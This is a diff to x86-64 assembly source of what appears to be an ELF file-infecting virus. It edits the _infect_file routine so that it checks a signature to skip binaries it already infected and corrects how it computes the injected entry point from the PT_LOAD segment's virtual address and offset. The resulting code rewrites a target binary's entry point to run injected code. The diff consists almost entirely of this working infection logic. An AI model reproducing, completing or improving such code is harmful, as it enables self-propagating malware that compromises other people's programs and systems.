@@ -316,30 +316,25 @@ _infect_file: ; (string rdi, stat rsi)
 
 	.is_elf_file:
 		cmp byte[rsi + 4], 2 ; ELFCLASS64
-		je .check_64_bit
+		je .check_if_infected
 		cmp byte[rsi + 4], 1 ; ELFCLASS32
 		jne .unmap
 		; TODO: do 32 bits version
-		.check_64_bit:
+		.check_if_infected:
+			lea rdi, [rel signature]
+			%ifdef DEBUG
+				call _print; _print(rdi)
+			%endif
+			call _ft_strlen
+			push rax
+			pop rcx
+			push rdi
+			pop rdx
+			mov rdi, r13
 			mov rsi, [r12 + 48]
-			cmp rsi, [r13 + 24]
-			jl .unmap ; TODO: infect binary where entrypoint is far (/bin/gcc-10)
-
-		; check if already infected
-		lea rdi, [rel signature]
-		%ifdef DEBUG
-			call _print; _print(rdi)
-		%endif
-		call _ft_strlen
-		push rax
-		pop rcx
-		push rdi
-		pop rdx
-		mov rdi, r13
-		mov rsi, [r12 + 48]
-		call _ft_memmem
-		cmp rax, 0x0
-		jne .unmap
+			call _ft_memmem
+			cmp rax, 0x0
+			jne .unmap
 
 		; get pt_load exec
 		mov rsi, [r13 + 32]; e_phoff
@@ -397,14 +392,22 @@ _infect_file: ; (string rdi, stat rsi)
 			mov [rax], rdi
 			mov rdi, [rbx + 32]; p_filesz
 			add [rax], rdi ; entry_inject
+			; copy mapped 'padding' like 0x400000
+			mov rdi, [rbx + 16]
+			add [rax], rdi; vaddr
+			mov rdi, [rbx + 8]
+			sub [rax], rdi; p_offset
 			add rax, 8
 			mov rdi, [r13 + 24]; entry_prg
 			mov [rax], rdi
 
 			; change entry
-			mov rsi, [rbx + 8]
-			add rsi, [rbx + 32]
-			mov [r13 + 24], rsi
+			mov rsi, [rbx + 8]; p_offset
+			add rsi, [rbx + 32]; p_filesz
+			; copy mapped 'padding' like 0x400000
+			add rsi, [rbx + 16]; vaddr
+			sub rsi, [rbx + 8]; p_offset
+			mov [r13 + 24], rsi ; new_entry
 
 			; change pt_load size
 			add rdx, 8 * 3
